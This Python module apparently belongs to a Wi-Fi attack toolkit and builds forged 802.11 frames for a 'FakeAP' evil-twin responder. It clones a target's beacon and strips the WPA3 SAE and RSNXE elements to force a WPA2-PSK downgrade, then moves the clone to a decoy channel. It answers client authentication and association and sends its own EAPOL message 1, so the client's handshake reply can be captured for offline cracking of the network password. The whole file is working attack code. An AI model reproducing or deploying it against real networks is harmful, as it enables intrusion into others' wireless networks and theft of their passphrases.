"""AP-side 802.11 response builders for the FakeAP responder (802.11 spec, no I/O).

``beacon_clone`` rewrites a captured beacon to a WPA2-only PSK twin (SAE stripped) on the decoy
channel; ``auth_resp`` / ``assoc_resp`` / ``eapol_m1`` answer auth/assoc then open the 4-way with
our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
"""
import struct

from wifit3.dot11.ie import rates_ie, ext_rates_ie, ds_param_ie, force_psk_akm, GENERIC_RSN_IE
from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL

_CAP_ESS_PRIVACY = 0x0011
_BEACON_HEAD = 36               # 24B MAC header + 12B fixed (timestamp, interval, capability)
_ELEMID_DS = 0x03
_ELEMID_RSN = 0x30
_ELEMID_HT_OP = 0x3D           # 61 HT Operation (primary channel + secondary-channel offset)
_ELEMID_VHT_OP = 0xC0          # 192 VHT Operation (channel width + center-frequency segments)
_ELEMID_RSNXE = 0xF4            # RSN Extended Caps: SAE hash-to-element, MFP-required advert
_M1_KEY_INFO = 0x008A          # Pairwise + Key ACK + key descriptor version 2 (HMAC-SHA1, PSK)
_CCMP_KEY_LEN = 16


def _resp_header(fc: bytes, bssid: bytes, client: bytes) -> bytes:
    return fc + b"\x00\x00" + client + bssid + bssid + b"\x00\x00"


def auth_resp(bssid: bytes, client: bytes) -> bytes:
    """Open-System Authentication response: algorithm 0, sequence 2, status 0."""
    return _resp_header(b"\xb0\x00", bssid, client) + b"\x00\x00\x02\x00\x00\x00"


def assoc_resp(bssid: bytes, client: bytes, aid: int = 1) -> bytes:
    """Association Response: ESS+Privacy capability, status 0 (success), AID, rate menus."""
    body = (struct.pack("<H", _CAP_ESS_PRIVACY) + b"\x00\x00" + struct.pack("<H", aid)
            + rates_ie() + ext_rates_ie())
    return _resp_header(b"\x10\x00", bssid, client) + body


def eapol_m1(bssid: bytes, client: bytes, anonce: bytes, replay: int = 1) -> bytes:
    """4-way message 1 (AP->client): our ANonce, no MIC."""
    payload = eapol_key(key_info=_M1_KEY_INFO, key_len=_CCMP_KEY_LEN, replay=replay, nonce=anonce)
    return data_header(to_ds=False, bssid=bssid, client=client) + LLC_SNAP_EAPOL + payload


def _ht_op_to_channel(elem: bytes, channel: int) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 2:
        body[0] = channel & 0xFF          # primary channel
        body[1] &= ~0x07                  # clear secondary-offset (bits 0-1) + STA width (bit 2)
    return elem[:2] + bytes(body)


def _vht_op_to_20mhz(elem: bytes) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 3:
        body[0] = 0                       # channel width 0 = 20/40 MHz
        body[1] = 0                       # center-freq seg 0
        body[2] = 0                       # center-freq seg 1
    return elem[:2] + bytes(body)


def beacon_clone(real_beacon: bytes, decoy_channel: int) -> bytes:
    """The target's beacon rewritten to a WPA2-PSK twin."""
    if len(real_beacon) < _BEACON_HEAD:
        raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
    head = bytearray(real_beacon[:_BEACON_HEAD])
    head[22:24] = b"\x00\x00"
    tags = real_beacon[_BEACON_HEAD:]
    kept = bytearray()
    ptr = 0
    while ptr + 2 <= len(tags):
        end = ptr + 2 + tags[ptr + 1]
        if end > len(tags):
            break
        elem = tags[ptr:end]
        tag_id = tags[ptr]
        if tag_id == _ELEMID_RSN:
            kept += force_psk_akm(bytes(elem)) or GENERIC_RSN_IE
        elif tag_id == _ELEMID_DS:
            kept += ds_param_ie(decoy_channel)
        elif tag_id == _ELEMID_HT_OP:
            kept += _ht_op_to_channel(bytes(elem), decoy_channel)
        elif tag_id == _ELEMID_VHT_OP:
            kept += _vht_op_to_20mhz(bytes(elem))
        elif tag_id != _ELEMID_RSNXE:
            kept += elem
        ptr = end
    return bytes(head) + bytes(kept)
